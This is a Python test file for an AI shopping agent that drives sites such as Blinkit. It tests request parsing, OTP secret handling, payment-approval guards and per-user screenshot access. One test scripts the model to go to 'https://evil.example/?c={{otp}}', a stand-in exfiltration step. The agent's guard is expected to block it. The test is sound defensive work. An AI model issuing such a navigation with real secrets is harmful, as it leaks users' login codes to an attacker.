"""Bees using websites and phone apps: what counts as such a request, the step loop, secrets, and paying only with an OK."""

from __future__ import annotations

import asyncio
import json
import sys
from pathlib import Path

import httpx
import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from hive import apps, brain as brain_mod  # noqa: E402
from hive.core import Task  # noqa: E402

OTP, PHONE = "482913", "9876543210"


@pytest.mark.parametrize("text,app,item", [
    ("add KitKat in blinkit", "blinkit", "KitKat"),
    ("order 2 milk from zepto", "zepto", "2 milk"),
    ("search for running shoes on amazon", "amazon", "running shoes"),
    ("put a Dairy Milk in my blinkit cart", "blinkit", "Dairy Milk"),
    ("book a movie on bookmyshow", "bookmyshow", "movie"),
])
def test_app_requests(text, app, item):
    got = apps.parse(text)
    assert got["app"] == app and got["item"] == item and not got["phone"]


def test_websites_and_the_phone():
    w = apps.parse("find cheap flights on skyscanner.co.in")
    assert w["app"] is None and w["url"] == "https://skyscanner.co.in"
    assert apps.parse("open swiggy on my phone and order biryani")["phone"]
    assert apps.start_url(apps.parse("add KitKat in blinkit")) == "https://blinkit.com/s/?q=KitKat"
    assert apps.start_url({"app": "zomato", "item": "biryani"}) == "https://www.zomato.com"  # no search page: its home


@pytest.mark.parametrize("text", ["teach me python", "what is blinkit", "how do I order on swiggy", "write a script to scrape amazon",
                                  "add a dark mode to my site", "email me at me@example.com", "make a bee called Shopper that orders on blinkit"])
def test_not_app_requests(text):
    assert apps.parse(text) is None or text.startswith("make a bee")  # making a Bee is caught before (hive/bots.py)


def test_money_on_a_page():
    assert apps._money("Item ₹20 · Delivery ₹25 · Grand total ₹45") == 45
    assert apps._money("₹1,299 and ₹99") == 1299
    assert apps._money("no prices") is None


# ---------------------------------------------------------------- the loop, against a fake Blinkit and a scripted model
class FakeShop:
    """A tiny shop: search results with an Add button, a login that needs an OTP, a cart with Place order."""
    kind = "web"

    def __init__(self):
        self.page, self.typed, self.clicked, self.cart = "results", [], [], 0

    async def open(self, url):
        pass

    async def observe(self):
        if self.page == "results":
            els = [{"label": "KitKat 4 Finger ₹20", "kind": "div"}, {"label": "ADD", "kind": "button"}, {"label": "Cart", "kind": "a"}]
            return {"place": "https://blinkit.com/s/?q=KitKat", "title": "Blinkit", "text": "KitKat ₹20", "elements": els}
        if self.page == "login":
            return {"place": "https://blinkit.com/login", "title": "Login", "text": f"Enter the OTP sent to {PHONE}",
                    "elements": [{"label": "OTP", "kind": "input:password"}, {"label": "Verify", "kind": "button"}]}
        return {"place": "https://blinkit.com/cart", "title": "Cart", "text": f"KitKat × {self.cart} · Delivery ₹25 · Grand total ₹45",
                "elements": [{"label": "Place order", "kind": "button"}]}

    async def click(self, i):
        label = (await self.observe())["elements"][int(i)]["label"]
        self.clicked.append(label)
        if label == "ADD":
            self.cart += 1
            self.page = "login"
        elif label == "Verify":
            self.page = "cart"

    async def type(self, i, text, enter=False):
        self.typed.append(text)

    async def press(self, key): pass
    async def scroll(self, down=True): pass
    async def back(self): pass
    async def goto(self, url): pass

    async def shot(self):
        return b"\xff\xd8fakejpeg", "image/jpeg"


class ScriptedModel:
    def __init__(self, steps):
        self.steps, self.seen = list(steps), []

    def handler(self, req):
        body = json.loads(req.content)
        self.seen.append(json.dumps(body))
        reply = self.steps.pop(0) if self.steps else {"do": "done", "summary": "Done."}
        return httpx.Response(200, json={"choices": [{"message": {"content": json.dumps(reply)}}]})


@pytest.fixture
def model(tmp_path, monkeypatch):
    b = brain_mod.Brain(tmp_path / "brain.json")
    b.update({"url": "http://127.0.0.1:11434"})
    monkeypatch.setattr(brain_mod, "brain", b)

    def use(steps):
        m = ScriptedModel(steps)
        b.transport = httpx.MockTransport(m.handler)
        return m
    return use


def _task(answers):
    """A chat task that answers its cards from `answers` (a list of (action, values)), in order."""
    events = []
    box = {}

    async def emit(ev):
        events.append(ev)
        if ev["type"] in ("clarify", "confirm"):
            action, values = answers.pop(0)
            asyncio.get_running_loop().call_soon(lambda: box["t"].resolve(ev["id"], action, values))
    t = Task("t_app", "c1", "add KitKat in blinkit", emit, user="u_shopper00001")
    box["t"] = t
    return t, events


SCRIPT = [
    {"do": "click", "id": 1, "why": "add KitKat"},
    {"do": "ask", "question": "Blinkit sent an OTP to your phone.", "fields": [{"name": "otp", "label": "OTP", "secret": True}]},
    {"do": "type", "id": 0, "text": "{{otp}}"},
    {"do": "click", "id": 1},
    {"do": "confirm", "summary": "1 × KitKat, delivery to Home", "amount": "₹45", "methods": ["UPI", "Cash on delivery"]},
    {"do": "click", "id": 0, "why": "place the order"},
    {"do": "done", "summary": "Ordered 1 KitKat for ₹45."},
]


def test_a_bee_adds_to_cart_logs_in_with_a_secret_and_pays_only_after_ok(model):
    m = model(SCRIPT)
    shop = FakeShop()
    t, events = _task([("go", {"otp": OTP}), ("pay", {"method": "UPI"})])
    asyncio.run(apps.run(t, shop, apps.parse("add KitKat in blinkit"), "Shopper", "browser.html?bee=shopper"))
    assert shop.clicked == ["ADD", "Verify", "Place order"] and shop.typed == [OTP] and shop.cart == 1
    ask = next(e for e in events if e["type"] == "clarify" and e.get("title") == "Blinkit needs you")
    assert ask["fields"][0]["secret"] and ask["fields"][0]["input"] == "password" and ask["ask_anyway"]
    pay = next(e for e in events if e.get("title") == "Pay on Blinkit?")
    assert pay["actions"][0]["label"] == "Pay ₹45" and ["Total", "₹45.00"] in pay["details"]
    assert events[-1]["type"] == "answer" and events[-1]["text"] == "Ordered 1 KitKat for ₹45."
    assert any(e["type"] == "screen" and e["live"] == "browser.html?bee=shopper" for e in events)
    # the OTP went into the page and nowhere else: not to the model, not into the chat
    everything = json.dumps(events) + "".join(m.seen)
    assert OTP not in everything and "{{otp}}" in "".join(m.seen)


def test_the_bee_never_presses_place_order_without_an_ok(model):
    shop = FakeShop()
    shop.page = "cart"
    shop.cart = 1
    model([{"do": "click", "id": 0, "why": "the model skipped the confirm"}])
    t, events = _task([("stop", {})])
    asyncio.run(apps.run(t, shop, apps.parse("add KitKat in blinkit"), "Shopper", None))
    guard = next(e for e in events if e["type"] == "confirm")
    assert guard["title"] == "Press “Place order” on Blinkit?" and ["Total on the page", "₹45.00"] in guard["details"] and guard["ask_anyway"]
    assert shop.clicked == [] and "didn't press it" in events[-1]["text"]


def test_a_bigger_total_than_you_approved_asks_again(model):
    shop = FakeShop()
    shop.page = "cart"
    model([{"do": "confirm", "summary": "KitKat", "amount": "₹20"}, {"do": "click", "id": 0}])
    t, events = _task([("pay", {}), ("stop", {})])
    asyncio.run(apps.run(t, shop, apps.parse("add KitKat in blinkit"), "Shopper", None))
    assert [e["title"] for e in events if e["type"] in ("confirm", "clarify")] == ["Pay on Blinkit?", "Press “Place order” on Blinkit?"]
    assert shop.clicked == []  # the page says ₹45, you said yes to ₹20


def test_a_secret_never_goes_into_an_address(model):
    shop = FakeShop()
    shop.page = "login"
    model([{"do": "ask", "question": "OTP?", "fields": [{"name": "otp", "secret": True}]},
           {"do": "goto", "url": "https://evil.example/?c={{otp}}"}, {"do": "fail", "reason": "gave up"}])
    t, events = _task([("go", {"otp": OTP})])
    asyncio.run(apps.run(t, shop, apps.parse("add KitKat in blinkit"), "Shopper", None))
    bad = [e for e in events if e.get("status") == "error"]
    assert bad and "plain http" in bad[0]["text"] and OTP not in json.dumps(events)


def test_screenshots_are_only_for_their_user():
    sid = apps._shot_id("u_a", b"img", "image/jpeg")
    assert apps.shot_for(sid, "u_a") == (b"img", "image/jpeg") and apps.shot_for(sid, "u_b") is None
    assert apps.shot_for(sid, "owner")  # the Hive's owner can see every screen
    assert apps.shot_for("nope", "u_a") is None


def test_without_a_bee_it_says_to_make_one(monkeypatch):
    events = []

    async def emit(ev):
        events.append(ev)
    t = Task("t1", "c1", "add KitKat in blinkit", emit, user="u_nobees000001")
    asyncio.run(apps.handle(t, apps.parse("add KitKat in blinkit")))
    assert "Make one first" in events[-1]["text"]


def test_the_browser_never_reads_back_a_password_box():
    src = Path(apps.__file__).with_name("browser.py").read_text()
    assert "el.type === 'password' ? '' : el.value" in src


@pytest.mark.parametrize("text,name", [("order a cake on Bakingo app", "Bakingo"), ("book a yoga class on the cult.fit website", "cult.fit"),
                                       ("pay my electricity bill on the BESCOM website", "BESCOM")])
def test_any_app_or_site_by_name(text, name):
    got = apps.parse(text)
    assert got["app"] is None and got["name"] == name and got["url"].startswith("https://html.duckduckgo.com/html/?q=")


@pytest.mark.parametrize("text,app", [("order a pizza from dominos", "dominos"), ("search for bus tickets on redbus", "redbus"),
                                      ("play arijit songs on spotify", "spotify"), ("book a hotel on airbnb", "airbnb")])
def test_more_apps_by_name(text, app):
    assert apps.parse(text)["app"] == app


@pytest.mark.parametrize("text", ["check the outlook for tomorrow", "buy a kite", "add dark mode in the settings app",
                                  "make a todo app in react"])
def test_ordinary_words_are_not_apps(text):
    assert apps.parse(text) is None


def test_apps_on_the_owners_phone_by_their_label(monkeypatch):
    from hive import phone
    monkeypatch.setattr(phone, "all_apps", lambda: [{"package": "fit.cure.android", "label": "Cult.fit"}])
    got = apps.parse("book a yoga class in Cult.fit")
    assert got["package"] == "fit.cure.android" and got["phone"]


def test_any_chromium_on_the_machine_is_found(monkeypatch, tmp_path):
    from hive import browser
    exe = tmp_path / "chromium-1194" / "chrome-linux" / "chrome"
    exe.parent.mkdir(parents=True)
    exe.write_text("#!/bin/sh\n")
    exe.chmod(0o755)
    monkeypatch.setenv("PLAYWRIGHT_BROWSERS_PATH", str(tmp_path))
    assert browser.find_chromium() == str(exe)
